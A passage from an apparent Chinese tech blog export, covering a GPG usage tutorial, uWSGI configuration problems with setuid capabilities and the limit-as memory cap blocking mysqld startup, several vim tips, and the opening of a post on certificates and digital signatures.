    <content><![CDATA[<h1 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h1><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><ul>
<li>uwsgi version： 2.0.13.1</li>
<li>python version: 2.6.6</li>
<li>采用 Nginx + uWSGI + Python 架构，均拥有ROOT权限</li>
</ul>
<h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>Python执行os.mkdir操作，提示“Permission Denied”</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;/cs/nginx/uwsgi/main.py&quot;, line 24, in application</span><br><span class="line">result = process().entry(environ, start_response)</span><br><span class="line">File &quot;/cs/nginx/uwsgi/rds/base_mng.py&quot;, line 90, in entry</span><br><span class="line">self.process_put_request(env)</span><br><span class="line">File &quot;/cs/nginx/uwsgi/rds/init_rds.py&quot;, line 149, in process_put_request</span><br><span class="line">result = self.do_put_request(env)</span><br><span class="line">File &quot;/cs/nginx/uwsgi/rds/init_rds.py&quot;, line 140, in do_put_request</span><br><span class="line">err_code = op.do()</span><br><span class="line">File &quot;/cs/nginx/uwsgi/rds/init_rds.py&quot;, line 70, in do</span><br><span class="line">if 0 == init_create_mp(mp):</span><br><span class="line">File &quot;/cs/nginx/uwsgi/rds/init/main.py&quot;, line 44, in init_create_mp</span><br><span class="line">os.mkdir(mp,0755)</span><br><span class="line">OSError: [Errno 13] Permission denied: &#x27;/aaab&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>Python脚本的权限，有uWSGI来决定，所以该错误肯定跟uWSGI有关，通过调整uwsgi.ini文件中的用户和权限相关配置发现，将<code>cap = setuid,setgid</code>去掉，可以正常创建目录。</p>
<p>但：<em><strong>具体原因不明，可能跟setuid和setgid的使用有关，有可能是个Bug</strong></em></p>
]]></content>
      <categories>
        <category>uwsgi</category>
      </categories>
      <tags>
        <tag>config</tag>
        <tag>uwsgi</tag>
      </tags>
  </entry>
  <entry>
    <title>GPG(GunPG)的使用</title>
    <url>/2017/05/18/security/gpg-usage/</url>
    <content><![CDATA[<p><img src="/images/security/gpg/gpg_usage.png" alt="gpg_usage.png"><br>加密的一个简单但又实用的任务就是发送加密电子邮件。多年来，为电子邮件进行加密的标准一直是PGP（Pretty Good Privacy）。程序员Phil Zimmermann特别为电子邮件的保密编写的PGP。这个软件非常好用，迅速流传开来，成了许多程序员的必备工具。但是，它是商业软件，不能自由使用。作为PGP的替代，如今已经有一个开放源代码的类似产品可供使用。GPG（Gnu Privacy Guard），它不包含专利算法，能够无限制的用于商业应用。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>RHEL7.2<br>  默认以安装GPG</li>
<li>GPG 2.0.22<br>  libgcrypt 1.5.3</li>
</ul>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h2><p>使用<code>--gen-key</code>生成一副新的密钥对</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg --gen-key</span></span><br><span class="line">gpg (GnuPG) 2.0.22; Copyright (C) 2013 Free Software Foundation, Inc.</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line">请选择您要使用的密钥种类：</span><br><span class="line">   (1) RSA and RSA (default)</span><br><span class="line">   (2) DSA and Elgamal</span><br><span class="line">   (3) DSA (仅用于签名)</span><br><span class="line">   (4) RSA (仅用于签名)</span><br><span class="line">您的选择？</span><br></pre></td></tr></table></figure>
<p>第一段是版权声明，然后让用户自己选择加密算法。默认选择第一个选项，表示加密和签名都使用RSA算法。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RSA 密钥长度应在 1024 位与 4096 位之间。</span><br><span class="line">您想要用多大的密钥尺寸？(2048)</span><br></pre></td></tr></table></figure>
<p>这一步要让我们输入密钥长度，长度越长越安全,默认为2048。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">您所要求的密钥尺寸是 2048 位              </span><br><span class="line">请设定这把密钥的有效期限。</span><br><span class="line">         0 = 密钥永不过期</span><br><span class="line">      &lt;n&gt;  = 密钥在 n 天后过期</span><br><span class="line">      &lt;n&gt;w = 密钥在 n 周后过期</span><br><span class="line">      &lt;n&gt;m = 密钥在 n 月后过期</span><br><span class="line">      &lt;n&gt;y = 密钥在 n 年后过期</span><br><span class="line">密钥的有效期限是？(0)</span><br></pre></td></tr></table></figure>
<p>如果密钥只是个人使用，并且你很确定可以有效保管私钥，建议选择第一个选项，即永不过期。注意，如果想设置在2年后过期，那么应该输入2y,然后回车 回答完上面三个问题以后，系统让你确认。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">密钥于 日 10/ 8 11:20:32 2017 CST 过期</span><br><span class="line">以上正确吗？(y/n)</span><br></pre></td></tr></table></figure>
<p>到这里，我们对要生成的密钥的配置已经完成了，然后我们还需要一个标识，接下来按照要求依次输入就行了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">You need a user ID to identify your key; the software constructs the user ID</span><br><span class="line">from the Real Name, Comment and Email Address in this form:</span><br><span class="line">    &quot;Heinrich Heine (Der Dichter) &lt;heinrichh@duesseldorf.de&gt;&quot;</span><br><span class="line"></span><br><span class="line">真实姓名：Zhang San</span><br><span class="line">电子邮件地址：zhangsan@x163.com</span><br><span class="line">注释：</span><br><span class="line"></span><br><span class="line">您选定了这个用户标识：</span><br><span class="line">    “Zhang San &lt;zhangsan@163.com&gt;”</span><br><span class="line"></span><br><span class="line">更改姓名(N)、注释(C)、电子邮件地址(E)或确定(O)/退出(Q)？</span><br></pre></td></tr></table></figure>
<p>输入<code>o</code>确定，然后在弹出的窗口输入密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">我们需要生成大量的随机字节。这个时候您可以多做些琐事(像是敲打键盘、移动</span><br><span class="line">鼠标、读写硬盘之类的)，这会让随机数字发生器有更好的机会获得足够的熵数。</span><br><span class="line">.+++++</span><br><span class="line">...+++++</span><br><span class="line">我们需要生成大量的随机字节。这个时候您可以多做些琐事(像是敲打键盘、移动</span><br><span class="line">鼠标、读写硬盘之类的)，这会让随机数字发生器有更好的机会获得足够的熵数。</span><br><span class="line">....................+++++</span><br><span class="line">...........+++++</span><br><span class="line">gpg: /home/XXXX/.gnupg/trustdb.gpg：建立了信任度数据库</span><br><span class="line">gpg: 密钥 74A64469 被标记为绝对信任</span><br><span class="line">公钥和私钥已经生成并经签名。</span><br><span class="line"></span><br><span class="line">gpg: 正在检查信任度数据库</span><br><span class="line">gpg: 需要 3 份勉强信任和 1 份完全信任，PGP 信任模型</span><br><span class="line">gpg: 深度：0 有效性：  1 已签名：  0 信任度：0-，0q，0n，0m，0f，1u</span><br><span class="line">gpg: 下次信任度数据库检查将于 2017-10-08 进行</span><br><span class="line">pub   2048R/74A64469 2016-10-08 [有效至：2017-10-08]</span><br><span class="line">密钥指纹 = 2187 78CA 2E78 83C2 039C  E47B D94A 622A 74A6 5569</span><br><span class="line">uid                  Zhang San &lt;zhangsan@163.com&gt;</span><br><span class="line">sub   2048R/490E5BC8 2016-10-08 [有效至：2017-10-08]</span><br></pre></td></tr></table></figure>
<p>请注意上面的字符串”74A64469”，这是”用户ID”的Hash字符串，可以用来替代”用户ID”。到此为止，我们已经完成了生成公钥和私钥的任务了,文件在&#x2F;home&#x2F;XXXX&#x2F;.gnupg&#x2F;pubring.gpg</p>
<p>这时，最好再生成一张”撤销证书”，以备以后密钥作废时，可以请求外部的公钥服务器撤销你的公钥。使用<code>--gen-revoke 74A64469</code>进行，此处不再赘述。</p>
<h2 id="查看密钥列表"><a href="#查看密钥列表" class="headerlink" title="查看密钥列表"></a>查看密钥列表</h2><p>使用<code>--list-keys</code>列出当前用户已有的密钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg --list-keys</span></span><br><span class="line">/home/zhoub/.gnupg/pubring.gpg</span><br><span class="line">------------------------------</span><br><span class="line">pub   2048R/6058BC49 2017-05-16</span><br><span class="line">uid                  zhou bo (for coreos build) &lt;zhoubofsy@hotmail.com&gt;</span><br><span class="line">sub   2048R/A47EF901 2017-05-16</span><br></pre></td></tr></table></figure>
<p>第一行显示公钥文件名（pubring.gpg），第二行显示公钥特征（2048位,RSA，Hash字符串和生成时间），第三行显示”用户ID”，第四行显示私钥特征(格式与公钥相同)。<br>如果你要从密钥列表中删除某个密钥，可以使用delete-key参数<code>gpg --delete-key [用户ID]</code></p>
<h2 id="输出密钥"><a href="#输出密钥" class="headerlink" title="输出密钥"></a>输出密钥</h2><p>** 公钥导出 **<br>公钥文件（.gnupg&#x2F;pubring.gpg）以二进制形式储存，armor参数可以将其转换为ASCII码显示。<code>gpg --armor --output public-key.txt --export [用户ID]</code></p>
<p>** 私钥导出 **<br>export-secret-keys参数可以转换私钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --armor --output private-key.txt --export-secret-keys</span><br></pre></td></tr></table></figure>

<h2 id="上传公钥"><a href="#上传公钥" class="headerlink" title="上传公钥"></a>上传公钥</h2><p>公钥服务器是网络上专门储存用户公钥的服务器。send-keys参数可以将公钥上传到服务器<code>gpg --send-keys [用户ID] --keyserver hkp://subkeys.pgp.net</code>使用上面的命令，你的公钥就被传到了服务器subkeys.pgp.net，然后通过交换机制，所有的公钥服务器最终都会包含你的公钥。</p>
<p>由于公钥服务器没有检查机制，任何人都可以用你的名义上传公钥，所以没有办法保证服务器上的公钥的可靠性。通常，你可以在网站上公布一个公钥指纹，让其他人核对下载到的公钥是否为真。fingerprint参数生成公钥指纹。<code>gpg --fingerprint [用户ID]</code></p>
<h2 id="输入密钥"><a href="#输入密钥" class="headerlink" title="输入密钥"></a>输入密钥</h2><p>除了生成自己的密钥，还需要将他人的公钥或者你的其他密钥输入系统。这时可以使用import参数<code>gpg --import [密钥文件]</code></p>
<p>为了获得他人的公钥，可以让对方直接发给你，或者到公钥服务器上寻找<code>gpg --keyserver hkp://subkeys.pgp.net --search-keys [用户ID]</code><br>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg --recv-keys E82E4209</span></span><br><span class="line">gpg: 下载密钥‘E82E4209’，从 hkp 服务器 keys.gnupg.net</span><br><span class="line">gpg: 密钥 E82E4209：公钥“Vladimir &#x27;phcoder&#x27; Serbinenko &lt;phcoder@gmail.com&gt;”已导入</span><br><span class="line">gpg: 没有找到任何绝对信任的密钥</span><br><span class="line">gpg: 合计被处理的数量：1</span><br><span class="line">gpg: 已导入：1</span><br></pre></td></tr></table></figure>

<h2 id="加密和解密"><a href="#加密和解密" class="headerlink" title="加密和解密"></a>加密和解密</h2><p>使用<code>--encrypt</code>参数用于加密。假设有一个原始文件<code>test.txt</code></p>
<p>** 使用公钥(Hash字符串)加密：**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg --recipient 74A64469 --output test_en.txt --encrypt test.txt</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>--recipient</code>参数指定接收者的公钥</li>
<li><code>--output</code>参数指定加密后的文件名</li>
<li><code>--encrypt</code>参数指定源文件</li>
</ul>
<p>** 使用私钥解密：**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg test_en.txt</span></span><br><span class="line"></span><br><span class="line">bogon:Desktop XXXX$ gpg test_en.txt</span><br><span class="line"></span><br><span class="line">您需要输入密码，才能解开这个用户的私钥：“Zhang San &lt;zhangsan@163.com&gt;”</span><br><span class="line">2048 位的 RSA 密钥，钥匙号 490E5BC8，建立于 2016-10-08 (主钥匙号 74A64469)</span><br><span class="line"></span><br><span class="line">gpg: 由 2048 位的 RSA 密钥加密，钥匙号为 490E5BC8、生成于 2016-10-08</span><br><span class="line">      “Zhang San &lt;zhangsan@163.com&gt;”</span><br><span class="line">gpg: test_en.txt：未知的后缀名</span><br><span class="line">请输入新的文件名 [test.txt]: test2.txt</span><br></pre></td></tr></table></figure>
<h2 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h2><p>有时，我们不需要加密文件，只需要对文件签名，表示这个文件确实是我本人发出的。<code>--sign</code>参数用来签名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg --sign test.txt</span></span><br></pre></td></tr></table></figure>
<p>然后生成了一个test.txt.gpg文件，我们打开这个文件后，发现这也是一个二进制的数据，这并不是加密后的数据，与上边的二进制数据不一样。<br>如果想生成ASCII码的签名文件，可以使用<code>--clearsign</code>参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg --clearsign test.txt</span></span><br></pre></td></tr></table></figure>
<p>然后生成了一个test.txt.asc文件。<br>如果想生成单独的签名文件，与文件内容分开存放，可以使用<code>--detach-sign</code>参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg --detach-sign test.txt</span></span><br></pre></td></tr></table></figure>
<p>多产生一个<code>,sig</code>的二进制签名文件，如果想采用ASCII码形式，要加上<code>--armor</code>参数。</p>
<h2 id="签名-加密"><a href="#签名-加密" class="headerlink" title="签名+加密"></a>签名+加密</h2><p>如果想同时签名和加密，可使用这种格式<code>gpg --local-user [发信者ID] --recipient [接收者ID] --armor --sign --encrypt test.txt</code></p>
<ul>
<li><code>--local-user</code>参数指定用发信者的私钥签名</li>
<li><code>--recipient</code>参数指定用接收者的公钥加密</li>
<li><code>--armor</code>参数表示采用ASCII码形式显示</li>
<li><code>--sign</code>参数表示需要签名</li>
<li><code>--encrypt</code>参数表示指定源文件</li>
</ul>
<h2 id="验证签名"><a href="#验证签名" class="headerlink" title="验证签名"></a>验证签名</h2><p>收到别人签名后的文件，需要用对方的公钥验证签名是否为真。使用<code>--verify</code>参数用来验证</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --verify test.txt.sig test.txt</span><br><span class="line">gpg: Signature made Wed 17 May 2017 04:12:50 PM CST using RSA key ID 74A64469</span><br><span class="line">gpg: Good signature from &quot;Zhang San &lt;zhangsan@163.com&gt;&quot;</span><br><span class="line">gpg: WARNING: This key is not certified with a trusted signature!</span><br><span class="line">gpg:          There is no indication that the signature belongs to the owner.</span><br><span class="line">Primary key fingerprint: 0B77 E327 B365 316D F112  4521 ABC0 9164 6058 BC49</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.cnblogs.com/machao/p/5938744.html">GPG终极指南（加密&#x2F;签名）</a></li>
<li><a href="http://www.cnblogs.com/daemon369/p/3204020.html">Linux下使用.sig签名文件验证签名</a></li>
</ul>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>gpg</tag>
        <tag>sign</tag>
      </tags>
  </entry>
  <entry>
    <title>limit-as限制子进程资源，导致Mysqld服务无法启动</title>
    <url>/2016/09/23/uwsgi/uwsgi-limit-process-resource/</url>
    <content><![CDATA[<h1 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h1><h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>在nginx+uwsgi+python环境中，启动mysqld服务，发生服务无法正常启动现象（闪退）。而在shell终端中可以正常启动mysqld服务。说明“nginx+uwsgi+python”这个环境限制了某些资源，导致mysqld服务启动失败。</p>
<h3 id="uwsgi错误日志-var-log-uwsgi-log"><a href="#uwsgi错误日志-var-log-uwsgi-log" class="headerlink" title="uwsgi错误日志(&#x2F;var&#x2F;log&#x2F;uwsgi.log)"></a>uwsgi错误日志(&#x2F;var&#x2F;log&#x2F;uwsgi.log)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Starting MySQL. ERROR! The server quit without updating PID file (/store/xxx.pid)</span><br></pre></td></tr></table></figure>

<h3 id="mysql错误日志-mysqldatadir-hostname-err"><a href="#mysql错误日志-mysqldatadir-hostname-err" class="headerlink" title="mysql错误日志(&#x2F;{mysqldatadir}&#x2F;{hostname}.err)"></a>mysql错误日志(&#x2F;{mysqldatadir}&#x2F;{hostname}.err)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2016-09-22 16:21:41 28084 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2016-09-22 16:21:41 28084 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2016-09-22 16:21:41 28084 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2016-09-22 16:21:41 28084 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2016-09-22 16:21:41 28084 [Note] InnoDB: Compressed tables use zlib 1.2.3</span><br><span class="line">2016-09-22 16:21:41 28084 [Note] InnoDB: Using CPU crc32 instructions</span><br><span class="line">2016-09-22 16:21:41 28084 [Note] InnoDB: Initializing buffer pool, size = 1.0G</span><br><span class="line">InnoDB: mmap(137363456 bytes) failed; errno 12</span><br><span class="line">2016-09-22 16:21:41 28084 [ERROR] InnoDB: Cannot allocate memory for the buffer pool</span><br><span class="line">2016-09-22 16:21:41 28084 [ERROR] Plugin &#x27;InnoDB&#x27; init function returned error.</span><br><span class="line">2016-09-22 16:21:41 28084 [ERROR] Plugin &#x27;InnoDB&#x27; registration as a STORAGE ENGINE failed.</span><br><span class="line">2016-09-22 16:21:41 28084 [ERROR] Unknown/unsupported storage engine: InnoDB</span><br><span class="line">2016-09-22 16:21:41 28084 [ERROR] Aborting</span><br><span class="line">2016-09-22 16:21:41 28084 [Note] Binlog end</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据mysql错误日志提示，mysql在初始化InnoDB引擎时，申请“Buffer Pool”内存失败，此处的mmap是用来申请内存的（allocate申请内存时，小于128KB的在栈上进行分配内存，大于128K的，从堆上分配内存）。<br>使用shell终端正常启动mysqld服务，查看mysqld占用内存大小发现需要2GB左右的虚拟内存，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">[root@host]# </span><span class="language-bash">ps aux | grep mysqld | grep -v grep</span></span><br><span class="line">root 31635 0.0 0.1 11300 1520 ? S Sep22 0:00 /bin/sh /cs/mysql/bin/mysqld_safe --datadir=/store --pid-file=/store/zhoubo.pid</span><br><span class="line">root 32165 0.0 25.5 2041620 259716 ? Sl Sep22 0:15 /cs/mysql/bin/mysqld --basedir=/cs/mysql --datadir=/store --plugin-dir=/cs/mysql/lib/plugin --user=root --log-error=/store/zhoubo.err --open-files-limit=65535 --pid-file=/store/zhoubo.pid --socket=/cs/mysql/data/mysql.sock --port=3306</span><br></pre></td></tr></table></figure>

<p>由此可以看出，“nginx+uwsgi+python”这个组合在其中某个环节对内存做了内存限制导致内存不能正常分配；nginx父进程为init，uwsgi父进程也为init，二者之间使用管道进行通信，所以不可能由nginx限制uwsgi进程资源。而uwsgi以fork形式调用python，fork过程中可以限制资源，python进程的资源被限制后再启动mysqld服务，就会导致mysqld分配内存失败，从而出现上述的错误现象。</p>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>根据上诉分析，找到了问题的原因出在uwsgi对进程资源进行了限制，所以将uwsgi.ini中关于资源限制的配置去掉，即可解决。<br>在uwsgi.ini中去掉<code>limit-as 256</code>选项。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>uwsgi.ini中资源限制项包括<code>limit-as</code>，<code>limit-nproc</code>，<code>limit-port</code>等，他们对进程资源的限制的访问获取都是通过系统接口getrlimt和setrlimit来实现的(POSIX API)。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getrlimit</span><span class="params">(<span class="type">int</span> resource, <span class="keyword">struct</span> rlimit *rlim)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setrlimit</span><span class="params">(<span class="type">int</span> resource, <span class="type">const</span> <span class="keyword">struct</span> rlimit *rlim)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prlimit</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> resource, <span class="type">const</span> <span class="keyword">struct</span> rlimit *new_limit,<span class="keyword">struct</span> rlimit *old_limit)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="核心结构体"><a href="#核心结构体" class="headerlink" title="核心结构体"></a>核心结构体</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rlimit</span>&#123;</span><br><span class="line">    <span class="type">rlim_t</span> rlim_cur;  <span class="comment">// soft limit</span></span><br><span class="line">    <span class="type">rlim_t</span> rlim_max;  <span class="comment">// hard limit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>rlim_cur</strong></p>
<p>为soft limit是指内核所能支持的资源上限。比如对于RLIMIT_NOFILE(一个进程能打开的最大文件数，内核默认是1024)，soft limit最大也只能达到1024。对于RLIMIT_CORE(core文件的大小，内核不做限制)，soft limit最大能是unlimited。</p>
<p><strong>rlim_max</strong></p>
<p>为hard limit在资源中只是作为soft limit的上限。当你设置hard limit后，你以后设置的soft limit只能小于hard limit。要说明的是，hard limit只针对非特权进程，也就是进程的有效用户ID(effective user ID)不是0的进程。具有特权级别的进程(具有属性CAP_SYS_RESOURCE)，soft limit则只有内核上限。</p>
<h3 id="可限制资源列表"><a href="#可限制资源列表" class="headerlink" title="可限制资源列表"></a>可限制资源列表</h3><table>
<thead>
<tr>
<th align="center">资源</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">RLIMIT_AS</td>
<td align="left">进程的最大虚拟内存空间，字节为单位</td>
</tr>
<tr>
<td align="center">RLIMIT_CORE</td>
<td align="left">内核转存文件的最大长度</td>
</tr>
<tr>
<td align="center">RLIMIT_CPU</td>
<td align="left">最大允许的CPU使用时间，秒为单位</td>
</tr>
<tr>
<td align="center">RLIMIT_DATA</td>
<td align="left">进程数据段的最大</td>
</tr>
<tr>
<td align="center">RLIMIT_FSIZE</td>
<td align="left">进程可建立的文件的最大长度</td>
</tr>
<tr>
<td align="center">RLIMIT_LOCKS</td>
<td align="left">进程可建立的锁和租赁的最大值</td>
</tr>
<tr>
<td align="center">RLIMIT_MEMLOCK</td>
<td align="left">进程可锁定在内存中的最大数据量，字节为单位</td>
</tr>
<tr>
<td align="center">RLIMIT_MSGQUEUE</td>
<td align="left">进程可为POSIX消息队列分配的最大字节数</td>
</tr>
<tr>
<td align="center">RLIMIT_NICE</td>
<td align="left">进程可通过setpriority() 或 nice()调用设置的最大完美值</td>
</tr>
<tr>
<td align="center">RLIMIT_NOFILE</td>
<td align="left">指定比进程可打开的最大文件描述词大一的值，超出此值，将会产生EMFILE错误</td>
</tr>
<tr>
<td align="center">RLIMIT_NPROC</td>
<td align="left">用户可拥有的最大进程数</td>
</tr>
<tr>
<td align="center">RLIMIT_RTPRIO</td>
<td align="left">进程可通过sched_setscheduler 和 sched_setparam设置的最大实时优先级</td>
</tr>
<tr>
<td align="center">RLIMIT_SIGPENDING</td>
<td align="left">用户可拥有的最大挂起信号数</td>
</tr>
<tr>
<td align="center">RLIMIT_STACK</td>
<td align="left">最大的进程堆栈，以字节为单位</td>
</tr>
</tbody></table>
<h1 id="参考及鸣谢"><a href="#参考及鸣谢" class="headerlink" title="参考及鸣谢"></a>参考及鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/todd911/article/details/14055745">《UNIX环境高级编程》笔记–getrlimit和setrlimit函数</a></li>
<li><a href="http://blog.csdn.net/kevin6216/article/details/15378617">uWSGI参考资料</a></li>
<li><a href="http://uwsgi-docs.readthedocs.io/en/latest/Options.html?highlight=limit-as">uWSGI Options(官方)</a></li>
<li><a href="http://blog.csdn.net/pennyliang/article/details/41678953">mmap ENOMEM（errno 12） 错误 </a></li>
<li><a href="http://www.cnblogs.com/vinozly/p/5489138.html">Linux进程分配内存的两种方式–brk() 和mmap()</a></li>
</ul>
]]></content>
      <categories>
        <category>uwsgi</category>
      </categories>
      <tags>
        <tag>config</tag>
        <tag>mysql</tag>
        <tag>uwsgi</tag>
        <tag>limit-as</tag>
      </tags>
  </entry>
  <entry>
    <title>drawit vim画图插件</title>
    <url>/2015/12/19/vim/vim_drawit/</url>
    <content><![CDATA[<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:zhoubofsy/DrawIt.git</span><br></pre></td></tr></table></figure>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>将解压后的”autoload”,”doc”,”plugin”文件复制到~&#x2F;.vim目录下</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="启动-退出DrawIt"><a href="#启动-退出DrawIt" class="headerlink" title="启动&amp;退出DrawIt"></a>启动&amp;退出DrawIt</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">di</span>     ;启动</span><br><span class="line">\<span class="keyword">ds</span>     ;关闭</span><br></pre></td></tr></table></figure>

<h2 id="画图"><a href="#画图" class="headerlink" title="画图"></a>画图</h2><p>在vim的visual block（可视块）模式下（ctrl+v）,画矩形框、椭圆</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">b</span>      ;矩形框</span><br><span class="line">\<span class="keyword">e</span>      ;椭圆</span><br></pre></td></tr></table></figure>

<h2 id="箭头"><a href="#箭头" class="headerlink" title="箭头"></a>箭头</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">^       ;上箭头</span><br><span class="line">v       ;下箭头</span><br><span class="line">&gt;       ;右箭头</span><br><span class="line">&lt;       ;左箭头</span><br></pre></td></tr></table></figure>

<h2 id="斜线"><a href="#斜线" class="headerlink" title="斜线"></a>斜线</h2><p>PgUp 右上斜线<br>PgDn 右下斜线<br>End　左下斜线<br>Home 左上斜线</p>
<p>注：　“\” 为 vim 中的 leader</p>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
        <tag>drawit</tag>
      </tags>
  </entry>
  <entry>
    <title>vim 配置</title>
    <url>/2015/12/16/vim/vim_config/</url>
    <content><![CDATA[<h2 id="vim-配置"><a href="#vim-配置" class="headerlink" title="vim 配置"></a>vim 配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/gmarik/vundle.vim.git ~/.vim/bundle/vundle</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/zhoubofsy/vim_env/blob/master/vimrc">vimrc 配置文件</a></p>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>config</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>vi(m)进制转换</title>
    <url>/2016/11/15/vim/vi-bin-text-change/</url>
    <content><![CDATA[<h1 id="vi命令"><a href="#vi命令" class="headerlink" title="vi命令"></a>vi命令</h1><p>使用“xxd”或“od”工具转换十六进制<br>方法如下：</p>
<ul>
<li><p><code>:%!xxd</code>将当前文本转换为16进制格式</p>
</li>
<li><p><code>:%!xxd -c 12</code>将当前文本转换为16进制格式,并每行显示12个字节</p>
</li>
<li><p><code>:%!xxd -r</code>将当前文件转换回文本格式</p>
</li>
<li><h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1></li>
<li><ol>
<li><a href="http://lwg2001s.iteye.com/blog/2035826">vi下以16进制查看二进制文件</a></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
        <tag>xxd</tag>
      </tags>
  </entry>
  <entry>
    <title>证书、签名、密钥那些事儿</title>
    <url>/2017/09/13/security/certificate-theory/</url>
    <content><![CDATA[<p>我对这些问题的理解，一直是模模糊糊的，很多细节搞不清楚。网上看到一篇文章<a href="http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html">《数字签名是什么？》</a>，发现思路一下子就理清了。为了加深记忆，我把文字和图片都复制过来。</p>
<p><img src="/images/certificate_theory/keys_1.png" alt="keys_1"></p>
<p><img src="/images/certificate_theory/keys_2.png" alt="keys_2"></p>
<p><img src="/images/certificate_theory/keys_3.png" alt="keys_3"></p>
<p><img src="/images/certificate_theory/keys_4.png" alt="keys_4"></p>
<p>鲍勃收信后，用私钥解密，就看到了信件内容。这里要强调的是，只要鲍勃的私钥不泄露，这封信就是安全的，即使落在别人手里，也无法解密。</p>
<p><img src="/images/certificate_theory/sign_1.png" alt="sign_1"></p>
<p>鲍勃给苏珊回信，决定采用”数字签名”。他写完后先用Hash函数，生成信件的摘要（digest）。</p>
<p><img src="/images/certificate_theory/sign_2.png" alt="sign_2"></p>
